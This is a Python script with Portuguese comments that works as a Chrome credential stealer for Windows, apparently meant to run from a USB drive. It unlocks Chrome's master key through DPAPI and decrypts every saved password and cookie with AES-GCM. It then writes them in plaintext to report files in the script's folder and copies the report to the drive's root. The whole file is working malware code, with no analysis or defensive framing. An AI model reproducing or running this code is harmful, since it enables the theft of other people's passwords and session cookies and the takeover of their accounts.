import os
import sys
import time
import json
import base64
import sqlite3
import shutil
import win32crypt
from Crypto.Cipher import AES
from datetime import datetime

# =============================================
# CONFIGURAÇÕES
# =============================================
USUARIO = os.getlogin()
PASTA_ATUAL = os.path.dirname(os.path.abspath(__file__))
PASTA_SAIDA = os.path.join(PASTA_ATUAL, "Credenciais")

# CRIA A PASTA IMEDIATAMENTE (MESMO ANTES DE QUALQUER COISA)
try:
    os.makedirs(PASTA_SAIDA, exist_ok=True)
except Exception as e:
    # Fallback: área de trabalho
    desktop = os.path.join(os.environ['USERPROFILE'], 'Desktop')
    PASTA_SAIDA = os.path.join(desktop, "Credenciais_Backup")
    os.makedirs(PASTA_SAIDA, exist_ok=True)

LOG_FILE = os.path.join(PASTA_SAIDA, f"log_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt")

def log(texto):
    with open(LOG_FILE, "a", encoding="utf-8") as f:
        f.write(str(texto) + "\n")

# =============================================
# FUNÇÕES DE COLETA
# =============================================
def pegar_chave_mestra():
    path = f"C:/Users/{USUARIO}/AppData/Local/Google/Chrome/User Data/Local State"
    if not os.path.exists(path):
        raise FileNotFoundError(f"Chrome não encontrado: {path}")
    with open(path, 'r', encoding='utf-8') as f:
        local = json.load(f)
    chave_enc = base64.b64decode(local["os_crypt"]["encrypted_key"])[5:]
    return win32crypt.CryptUnprotectData(chave_enc, None, None, None, 0)[1]

def coletar_senhas(chave):
    log("  [+] Senhas...")
    caminho = f"C:/Users/{USUARIO}/AppData/Local/Google/Chrome/User Data/Default/Login Data"
    if not os.path.exists(caminho):
        return ["Chrome não possui dados de login."]
    temp = os.path.join(PASTA_SAIDA, "temp_senhas.db")
    shutil.copyfile(caminho, temp)
    creds = []
    conn = sqlite3.connect(temp)
    cursor = conn.cursor()
    cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
    for url, user, enc in cursor.fetchall():
        try:
            nonce = enc[3:15]
            cipher = enc[15:-16]
            tag = enc[-16:]
            aes = AES.new(chave, AES.MODE_GCM, nonce=nonce)
            senha = aes.decrypt_and_verify(cipher, tag).decode('utf-8')
            creds.append(f"URL: {url}\nUsuário: {user}\nSenha: {senha}\n")
        except Exception as e:
            log(f"    Erro ao descriptografar: {e}")
    conn.close()
    os.remove(temp)
    log(f"    OK {len(creds)} senhas.")
    return creds

def coletar_cookies(chave):
    log("  [+] Cookies...")
    caminho = f"C:/Users/{USUARIO}/AppData/Local/Google/Chrome/User Data/Default/Network/Cookies"
    if not os.path.exists(caminho):
        log("    Arquivo de cookies não encontrado.")
        return []
    
    temp = os.path.join(PASTA_SAIDA, "temp_cookies.db")
    try:
        shutil.copyfile(caminho, temp)
    except PermissionError:
        log("    PERMISSAO NEGADA: Chrome aberto? Feche e tente novamente.")
        # Cria um arquivo de aviso na pasta
        with open(os.path.join(PASTA_SAIDA, "AVISO_Chrome_Aberto.txt"), "w") as f:
            f.write("O Chrome estava aberto durante a execução.\n")
            f.write("Feche o Chrome e execute novamente para coletar cookies.\n")
        return []  # Não interrompe a execução

    cookies = []
    conn = sqlite3.connect(temp)
    cursor = conn.cursor()
    cursor.execute("SELECT host_key, name, encrypted_value FROM cookies")
    for host, nome, enc in cursor.fetchall():
        try:
            nonce = enc[3:15]
            cipher = enc[15:-16]
            tag = enc[-16:]
            aes = AES.new(chave, AES.MODE_GCM, nonce=nonce)
            valor = aes.decrypt_and_verify(cipher, tag).decode('utf-8')
            cookies.append(f"Host: {host}\nCookie: {nome}={valor}\n")
        except:
            pass
    conn.close()
    os.remove(temp)
    log(f"    OK {len(cookies)} cookies.")
    return cookies

# =============================================
# MAIN
# =============================================
def main():
    log("="*60)
    log("COLETOR MAXIMO (SEM BLOQUEIO)")
    log(f"Data: {datetime.now().strftime('%d/%m/%Y %H:%M:%S')}")
    log(f"Usuário: {USUARIO}")
    log(f"Pasta de saída: {PASTA_SAIDA}")
    log("="*60)

    try:
        chave = pegar_chave_mestra()
        log("\n[OK] Chave obtida.")
    except Exception as e:
        log(f"[ERRO] Falha ao obter chave: {e}")
        with open(os.path.join(PASTA_SAIDA, "erro_chave.txt"), "w") as f:
            f.write(str(e))
        return

    log("\n[+] Coletando dados...")
    dados = {
        "senhas": coletar_senhas(chave),
        "cookies": coletar_cookies(chave)
    }

    # Salva relatório
    nome = f"credenciais_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"
    caminho = os.path.join(PASTA_SAIDA, nome)
    with open(caminho, "w", encoding="utf-8") as f:
        f.write("="*80 + "\n")
        f.write("RELATORIO COMPLETO\n")
        f.write(f"Data: {datetime.now().strftime('%d/%m/%Y %H:%M:%S')}\n")
        f.write(f"Usuario: {USUARIO}\n")
        f.write("="*80 + "\n\n")
        for secao, itens in dados.items():
            f.write(f"[{secao.upper()}]\n")
            f.write("-"*40 + "\n")
            if itens:
                for item in itens:
                    f.write(item + "\n")
            else:
                f.write("Nenhum dado encontrado.\n")
            f.write("\n")

    # Cópia para a raiz do pendrive
    try:
        shutil.copy(caminho, os.path.join(PASTA_ATUAL, nome))
        log(f"\n[OK] Relatório salvo em: {caminho}")
        log(f"[OK] Cópia na raiz: {nome}")
    except Exception as e:
        log(f"[AVISO] Não foi possível copiar para a raiz: {e}")

    log("\n" + "="*60)
    log("FIM DA EXECUCAO")
    time.sleep(3)

if __name__ == "__main__":
    main()
